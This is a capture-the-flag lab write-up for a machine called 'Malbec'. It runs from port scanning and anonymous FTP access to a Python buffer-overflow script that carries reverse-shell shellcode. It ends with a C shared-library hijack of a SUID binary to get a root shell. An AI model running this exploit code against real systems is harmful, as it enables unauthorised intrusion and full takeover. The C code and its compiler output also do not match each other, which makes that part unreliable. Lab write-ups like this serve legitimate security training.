# Malbec

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.240.129
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 13:44 +08
Nmap scan report for 192.168.240.129
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
2121/tcp open  ccproxy-ftp
7138/tcp open  unknown
```

We can do a detailed scan on this machine in case.

```
$ sudo nmap -p 22,2121,7138 -sC -sV --min-rate 4000 192.168.240.129                
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 13:45 +08
Nmap scan report for 192.168.240.129
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
2121/tcp open  ftp     pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 carlos   carlos     108304 Jan 25  2021 malbec.exe [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.240.129:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
7138/tcp open  unknown
```

Port 2121 is FTP it seems.

### FTP -> Buffer Overflow

FTP allowed for anonymous access and it only had one file:

```
$ ftp 192.168.240.129 -p 2121
Connected to 192.168.240.129.
220 pyftpdlib 1.5.6 ready.
Name (192.168.240.129:kali): anonymous
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering extended passive mode (|||49067|).
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 carlos   carlos     108304 Jan 25  2021 malbec.exe
```

We can download this `.exe` file to a Windows machine for some reverse engineering.&#x20;

<figure><img src="../../../.gitbook/assets/image (3567).png" alt=""><figcaption><p><em>Old IP from Old Writeup</em></p></figcaption></figure>

When we check the listening ports on our Windows machine, we would see that `malbec.exe` opens port 7138:

<figure><img src="../../../.gitbook/assets/image (1062).png" alt=""><figcaption></figcaption></figure>

This machine thus becomes a classic buffer overflow exploit as per OSCP. For this particular binary, there weren't any bad characters (other than the NULL byte) and it was just a matter of fuzzing the offset required.&#x20;

I won't be going through how to do it since the OSCP BOF style is prett well-documented already, so here's the final script I used:

```python
#!/usr/bin/python2
import socket

ip = "192.168.240.129"
port = 7138
timeout = 5

pattern = ""
#badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# final badchars are \x00
# msfvenom --payload linux/x86/shell_reverse_tcp LHOST=192.168.45.216 LPORT=21 --format c --bad-chars '\x00'
print ("\nSending evil buffer...")
size = 340
offset = "A"*size #filler
eip = "\x03\x15\x10\x41" #rtn
nop = "\x90" * 162
payload =("\xdb\xcf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x12\xbf\xc0\xf8"
"\xda\x09\x31\x7a\x17\x03\x7a\x17\x83\x2a\x04\x38\xfc\x9b"
"\x2e\x4a\x1c\x88\x93\xe6\x89\x2c\x9d\xe8\xfe\x56\x50\x6a"
"\x6d\xcf\xda\x54\x5f\x6f\x53\xd2\xa6\x07\xa4\x8c\x74\x0f"
"\x4c\xcf\x86\xaf\x98\x46\x67\x1f\xc4\x08\x39\x0c\xba\xaa"
"\x30\x53\x71\x2c\x10\xfb\xe4\x02\xe6\x93\x90\x73\x27\x01"
"\x08\x05\xd4\x97\x99\x9c\xfa\xa7\x15\x52\x7c")

#buffer = pattern  #for fuzzing offset
#buffer = offset + badchars #for fuzzing bad chars
buffer = offset + eip + nop + payload 


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(bytes(buffer + "\r\n".encode("latin-1")))
s.close()
print ("\nDone!")
```

We can run this exploit and get a shell as the user:

```
$ python2 exploit_main.py

Sending evil buffer...

Done!
```

<figure><img src="../../../.gitbook/assets/image (2766).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SUID Binary -> Malicious Library

I ran a `linpeas.sh` scan on the machine, and it found a few interesting things.  Firstly, `root` is running `ldconfig` periodically:

<figure><img src="../../../.gitbook/assets/image (4032).png" alt=""><figcaption></figcaption></figure>

The next was this SUID binary that I didn't recognise:

```
-rwsr-xr-x 1 root root        17K Jan 26  2021 /usr/bin/messenger
```

The last was a misconfiguration of the `ld.so` files:

<figure><img src="../../../.gitbook/assets/image (3234).png" alt=""><figcaption></figcaption></figure>

This was interesting, because it appears that the user's home directory is the part of the configuration, meaning that `.so` files are executed from this directory. We can run `ldd` for the `messenger` binary to check where it loads its shared object files.&#x20;

```
carlos@malbec:/tmp$ ldd /usr/bin/messenger 
        linux-vdso.so.1 (0x00007ffd865bc000)
        libmalbec.so => not found
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f64cb634000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f64cb80a000)
```

So it appears that `libmalbec.so` is not found, and it loads it from `/home/carlos`. This means that we can just create a malicious `libmalbec.so` file that gives us a shell, and since `messenger` is an SUID binary, the shell will be with `root` privileges.&#x20;

Here's the source code I took from HackTricks:

{% code overflow="wrap" %}
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
// this function name is a result of testing, since it appears that the binary executes a malbec function
// you would get this error if not named properly:
// /usr/bin/messenger: symbol lookup error: /usr/bin/messenger: undefined symbol: malbec
void malbec(){ # the 
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```
{% endcode %}

We just need to compile this and transfer it to the machine:

```
$ gcc -shared -o libmalbec.so -fPIC exploit.c                            
exploit.c: In function ‘say_hi’:
exploit.c:9:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    9 |     system("/bin/sh",NULL,NULL);
      |  
```

Afterwards, we can wait for `root` to execute `ldconfig`, which would configure the `messenger` binary to use the `libmalbec.so` file we created. Once it does, it will show up in `ldd`:

```
carlos@malbec:/home/carlos$ ldd /usr/bin/messenger
        linux-vdso.so.1 (0x00007ffe3a3e4000)
        libmalbec.so => /home/carlos/libmalbec.so (0x00007f0975667000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f09754a6000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f0975681000)
```

Then, we can just execute `messenger` to get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (2502).png" alt=""><figcaption></figcaption></figure>
